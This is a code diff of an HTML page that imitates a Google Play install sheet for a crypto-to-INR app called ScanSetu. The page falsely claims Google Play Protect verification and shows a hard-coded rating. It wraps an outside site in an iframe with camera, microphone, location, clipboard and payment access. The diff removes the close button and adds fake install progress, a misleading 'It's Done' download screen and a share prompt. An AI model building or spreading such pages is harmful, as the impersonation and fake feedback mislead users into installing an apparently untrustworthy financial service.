@@ -31,7 +31,6 @@
   </style>
 
   <script>
-    // Standalone check runs immediately in head to eliminate white flash / UI flicker
     const isStandalone = window.matchMedia('(display-mode: standalone)').matches || 
                          window.matchMedia('(display-mode: fullscreen)').matches || 
                          window.navigator.standalone === true ||
@@ -53,7 +52,7 @@
   <!-- ==================== LAYER 1: STANDALONE APP (FULLSCREEN IFRAME) ==================== -->
   <div id="appContainer" class="hidden fixed inset-0 w-full h-full z-50 bg-[#000000]">
     <iframe 
-      id="mainFrame"
+      id="mainFrame" 
       src="https://scansetu.akashbhai.com/?source=pwa" 
       class="w-full h-full border-0 outline-none"
       allow="camera; microphone; geolocation; clipboard-read; clipboard-write; payment" 
@@ -72,7 +71,7 @@
           </svg>
           <span class="text-[15px] text-[#e3e3e3] flex-1">ScanSetu</span>
           <div class="w-7 h-7 rounded-full overflow-hidden bg-[#25272a] shrink-0 border border-[#44474f] p-0.5">
-            <img src="https://scansetu.co/assets/logo-icon-CcFvR6-7.png" class="w-full h-full object-cover">
+            <img src="https://scansetu.co/assets/logo-icon-CcFvR6-7.png" class="w-full h-full object-cover" alt="logo">
           </div>
         </div>
         <div class="flex items-center gap-6 text-[14px] text-[#9aa0a6] font-medium pt-0.5">
@@ -94,18 +93,13 @@
     <div id="installSheet" class="sheet-transition fixed bottom-0 left-0 right-0 z-30 max-w-md mx-auto bg-[#1e1f22] text-[#e3e3e3] rounded-t-[28px] shadow-2xl flex flex-col max-h-[92vh] overflow-y-auto no-scrollbar border-t border-[#333539]">
       <div class="px-5 pt-4 pb-2 flex items-center justify-between sticky top-0 bg-[#1e1f22] z-20">
         <span class="text-xl font-medium text-white">Google Play</span>
-        <button onclick="dismissLanding()" class="p-1 rounded-full text-[#c4c7c5]">
-          <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
-          </svg>
-        </button>
       </div>
 
-      <div class="px-5 pb-6 space-y-5">
-        <!-- App Header -->
+      <!-- MAIN APP INFO VIEW -->
+      <div id="appDetailsView" class="px-5 pb-6 space-y-5">
         <div class="flex items-start gap-4 mt-1">
           <div class="shrink-0 w-[72px] h-[72px] bg-[#15171a] rounded-[18px] p-2 border border-[#3b3d42]">
-            <img src="https://scansetu.co/assets/logo-icon-CcFvR6-7.png" class="w-full h-full object-contain">
+            <img src="https://scansetu.co/assets/logo-icon-CcFvR6-7.png" class="w-full h-full object-contain" alt="logo">
           </div>
           <div class="flex flex-col justify-center min-w-0 flex-1">
             <h1 class="text-[20px] font-bold text-white leading-snug">ScanSetu - Crypto to INR</h1>
@@ -114,7 +108,6 @@
           </div>
         </div>
 
-        <!-- Metrics -->
         <div class="flex items-center justify-between py-2 border-t border-b border-[#2d2f33] text-center">
           <div class="flex-1">
             <span class="text-[14px] font-bold text-white">4.9 ★</span>
@@ -132,55 +125,87 @@
           </div>
         </div>
 
-        <!-- Actions -->
         <div class="space-y-2">
-          <div id="defaultActionRow">
-            <button 
-              id="installBtn" 
-              onclick="triggerInstall()" 
-              class="relative overflow-hidden w-full h-[46px] bg-[#e3e3e3] hover:bg-white text-[#000000] font-bold text-[15px] rounded-full flex items-center justify-center transition shadow-md"
-            >
-              <div id="progressBar" class="absolute inset-y-0 left-0 bg-[#01875f] w-0 transition-all duration-100"></div>
-              <span id="btnText" class="relative z-10">Install</span>
-            </button>
-          </div>
-
-          <!-- Installed Success State (Replaces the broken 'Open' link) -->
-          <div id="installedActionRow" class="hidden flex-col gap-2 w-full">
-            <div class="p-3 bg-[#132d22] border border-[#01875f]/40 rounded-xl text-center">
-              <p class="text-[14px] font-bold text-[#34a853]">✓ App Installed Successfully</p>
-              <p class="text-[12px] text-[#c4c7c5] mt-0.5">Please open <b>ScanSetu</b> from your phone's Home Screen.</p>
-            </div>
-            <button onclick="dismissLanding()" class="w-full h-[44px] bg-[#2a2c30] hover:bg-[#333539] text-[#e3e3e3] font-medium text-[14px] rounded-full flex items-center justify-center transition">
-              Close Window
-            </button>
-          </div>
-
+          <button 
+            id="installBtn" 
+            onclick="triggerInstall()" 
+            class="relative overflow-hidden w-full h-[46px] bg-[#e3e3e3] hover:bg-white text-[#000000] font-bold text-[15px] rounded-full flex items-center justify-center transition shadow-md"
+          >
+            <div id="progressBar" class="absolute inset-y-0 left-0 bg-[#01875f] w-0 transition-all duration-100"></div>
+            <span id="btnText" class="relative z-10">Install</span>
+          </button>
           <p class="text-center text-[11px] text-[#9aa0a6]">Verified by Google Play Protect</p>
         </div>
 
-        <!-- Screenshots Preview -->
         <div class="space-y-2 pt-1">
           <span class="text-[14px] font-bold text-white">Preview</span>
           <div class="flex gap-3 overflow-x-auto no-scrollbar pb-1 -mx-5 px-5 snap-x">
-            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae857d76e5b1.59212105_Screenshot2026-09-19182121.png" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0">
-            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae85b8ba7f35.28612269_photo_2026-09-19_18-15-50.jpg" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0">
-            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae85de369fc8.17124977_photo_2026-09-19_18-14-50.jpg" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0">
-            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae87d2426445.50433041_ChatGPTImageSep19202606_31_44PM.png" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0">
-            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae88f0882191.16167707_ChatGPTImageSep19202606_36_45PM.png" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0">
+            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae857d76e5b1.59212105_Screenshot2026-09-19182121.png" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0" alt="preview">
+            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae85b8ba7f35.28612269_photo_2026-09-19_18-15-50.jpg" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0" alt="preview">
+            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae85de369fc8.17124977_photo_2026-09-19_18-14-50.jpg" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0" alt="preview">
+            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae87d2426445.50433041_ChatGPTImageSep19202606_31_44PM.png" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0" alt="preview">
+            <img src="https://d1yei2z3i6k35z.cloudfront.net/13184094/6aae88f0882191.16167707_ChatGPTImageSep19202606_36_45PM.png" class="w-[110px] h-[195px] rounded-2xl object-cover border border-[#3b3d42] shrink-0" alt="preview">
           </div>
         </div>
       </div>
+
+      <!-- ==================== POST-INSTALL SUCCESS SCREEN ==================== -->
+      <div id="postInstallScreen" class="hidden px-6 pt-2 pb-8 flex-col items-center text-center space-y-5">
+        <div class="w-16 h-16 bg-[#132d22] border border-[#01875f] text-[#34a853] rounded-full flex items-center justify-center text-3xl shadow-inner mt-2">
+          ✓
+        </div>
+
+        <div class="space-y-1">
+          <h2 class="text-2xl font-bold text-white tracking-tight">It's Done ~</h2>
+          <p class="text-[14px] text-[#e3e3e3] font-medium leading-relaxed">
+            Wait for download. Check on your apps: <span class="text-[#a8c7fa] font-semibold">ScanSetu</span>
+          </p>
+          <p class="text-[12px] text-[#9aa0a6] mt-1">
+            It can take 2 - 5 mins to download.
+          </p>
+        </div>
+
+        <div class="w-full space-y-3 pt-2">
+          <!-- Share With Friends Button -->
+          <button 
+            id="shareBtn" 
+            onclick="shareApp()" 
+            class="w-full h-[46px] bg-[#a8c7fa] hover:bg-[#8ab4f8] text-[#041e49] font-bold text-[15px] rounded-full flex items-center justify-center gap-2 transition shadow-md"
+          >
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"/>
+            </svg>
+            <span id="shareBtnText">Share with Friends</span>
+          </button>
+
+          <!-- Retry Button (Visible after 2 minutes) -->
+          <div id="retryWrapper" class="w-full">
+            <p id="retryTimerNotice" class="text-[11px] text-[#5f6368]">Retry option will activate in <span id="timeRemaining">2:00</span></p>
+            <button 
+              id="retryBtn" 
+              onclick="retryDownload()" 
+              class="hidden w-full h-[44px] bg-[#2a2c30] hover:bg-[#35383e] text-[#e3e3e3] border border-[#3b3d42] font-medium text-[14px] rounded-full items-center justify-center transition"
+            >
+              Not downloaded yet? Retry
+            </button>
+          </div>
+        </div>
+      </div>
+
     </div>
   </div>
 
   <script>
     let deferredPrompt = null;
-    const defaultActionRow = document.getElementById('defaultActionRow');
-    const installedActionRow = document.getElementById('installedActionRow');
+    const appDetailsView = document.getElementById('appDetailsView');
+    const postInstallScreen = document.getElementById('postInstallScreen');
     const installBtn = document.getElementById('installBtn');
     const btnText = document.getElementById('btnText');
     const progressBar = document.getElementById('progressBar');
+    const retryBtn = document.getElementById('retryBtn');
+    const retryTimerNotice = document.getElementById('retryTimerNotice');
+    const timeRemainingSpan = document.getElementById('timeRemaining');
+    const shareBtnText = document.getElementById('shareBtnText');
 
     window.addEventListener('beforeinstallprompt', (e) => {
       e.preventDefault();
@@ -189,27 +214,20 @@
 
     window.addEventListener('appinstalled', () => {
       deferredPrompt = null;
-      showInstalledSuccess();
+      showPostInstallScreen();
     });
 
-    function showInstalledSuccess() {
-      defaultActionRow.classList.add('hidden');
-      installedActionRow.classList.remove('hidden');
-      installedActionRow.classList.add('flex');
-    }
-
-    function dismissLanding() {
-      window.close();
-      // If browser security blocks window.close(), redirect to about:blank or blank state
-      setTimeout(() => {
-        window.location.href = "about:blank";
-      }, 200);
+    function showPostInstallScreen() {
+      appDetailsView.classList.add('hidden');
+      postInstallScreen.classList.remove('hidden');
+      postInstallScreen.classList.add('flex');
+      startRetryTimer(120); // 2 minutes (120 seconds)
     }
 
     async function triggerInstall() {
       if (!deferredPrompt) {
-        // Fallback for browsers that already installed or don't support beforeinstallprompt
-        showInstalledSuccess();
+        // Fallback progress simulation
+        simulateProgressAndFinish();
         return;
       }
 
@@ -218,28 +236,88 @@
 
       if (choiceResult.outcome === 'accepted') {
         deferredPrompt = null;
-        installBtn.className = "relative overflow-hidden w-full h-[46px] bg-[#23252a] text-white font-bold text-[15px] rounded-full flex items-center justify-center border border-[#3b3d42]";
-        
-        let p = 0;
-        const interval = setInterval(() => {
-          p += 5;
-          if (p > 100) p = 100;
-          progressBar.style.width = p + '%';
-          btnText.innerText = p + '%';
-
-          if (p >= 100) {
-            clearInterval(interval);
-            btnText.innerText = 'Installing...';
-            setTimeout(() => {
-              showInstalledSuccess();
-            }, 600);
-          }
-        }, 30);
+        simulateProgressAndFinish();
       } else {
-        // User cancelled prompt
         btnText.innerText = 'Install';
         progressBar.style.width = '0%';
       }
+    }
+
+    function simulateProgressAndFinish() {
+      installBtn.className = "relative overflow-hidden w-full h-[46px] bg-[#23252a] text-white font-bold text-[15px] rounded-full flex items-center justify-center border border-[#3b3d42]";
+      let p = 0;
+      const interval = setInterval(() => {
+        p += 5;
+        if (p > 100) p = 100;
+        progressBar.style.width = p + '%';
+        btnText.innerText = p + '%';
+
+        if (p >= 100) {
+          clearInterval(interval);
+          btnText.innerText = 'Installing...';
+          setTimeout(() => {
+            showPostInstallScreen();
+          }, 600);
+        }
+      }, 30);
+    }
+
+    function startRetryTimer(seconds) {
+      let timeLeft = seconds;
+      const timer = setInterval(() => {
+        timeLeft--;
+        const mins = Math.floor(timeLeft / 60);
+        const secs = timeLeft % 60;
+        if (timeRemainingSpan) {
+          timeRemainingSpan.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }
+
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          if (retryTimerNotice) retryTimerNotice.classList.add('hidden');
+          if (retryBtn) {
+            retryBtn.classList.remove('hidden');
+            retryBtn.classList.add('flex');
+          }
+        }
+      }, 1000);
+    }
+
+    async function shareApp() {
+      const shareData = {
+        title: 'ScanSetu - Crypto to INR',
+        text: 'Download ScanSetu app for instant Crypto to INR transfers!',
+        url: window.location.href
+      };
+
+      if (navigator.share) {
+        try {
+          await navigator.share(shareData);
+        } catch (err) {
+          // User canceled or failed silently
+        }
+      } else {
+        // Fallback: Copy current URL to clipboard
+        navigator.clipboard.writeText(window.location.href).then(() => {
+          shareBtnText.innerText = 'Link Copied!';
+          setTimeout(() => {
+            shareBtnText.innerText = 'Share with Friends';
+          }, 2500);
+        }).catch(() => {
+          prompt('Copy this link to share:', window.location.href);
+        });
+      }
+    }
+
+    function retryDownload() {
+      postInstallScreen.classList.add('hidden');
+      postInstallScreen.classList.remove('flex');
+      appDetailsView.classList.remove('hidden');
+
+      // Reset button state
+      installBtn.className = "relative overflow-hidden w-full h-[46px] bg-[#e3e3e3] hover:bg-white text-[#000000] font-bold text-[15px] rounded-full flex items-center justify-center transition shadow-md";
+      progressBar.style.width = '0%';
+      btnText.innerText = 'Install';
     }
   </script>
 </body>
